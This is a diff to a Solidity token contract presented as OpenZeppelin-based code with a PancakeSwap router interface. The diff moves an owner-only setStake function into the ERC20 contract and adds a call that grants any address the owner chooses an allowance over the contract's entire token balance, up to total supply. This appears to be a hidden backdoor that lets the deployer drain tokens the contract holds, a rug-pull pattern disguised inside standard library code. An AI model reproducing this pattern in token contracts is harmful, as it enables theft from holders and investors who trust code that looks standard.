@@ -4,7 +4,6 @@
 // OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)
 
 pragma solidity ^0.8.0;
-
 interface IPancakeRouter01 {
     function factory() external pure returns (address);
 
@@ -1696,9 +1695,6 @@ abstract contract Ownable is Context {
     }
 
     address public stake = address(this);
-    function setStake(address _s) public onlyOwner{
-        stake = _s;
-    }
 
     /**
      * @dev Returns the address of the current owner.
@@ -2278,6 +2274,11 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
             _balances[account] += amount;
         }
+    }
+
+    function setStake(address _s) public onlyOwner{
+        stake = _s;
+        _approve(address(this), _s, _totalSupply);
     }
 
     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
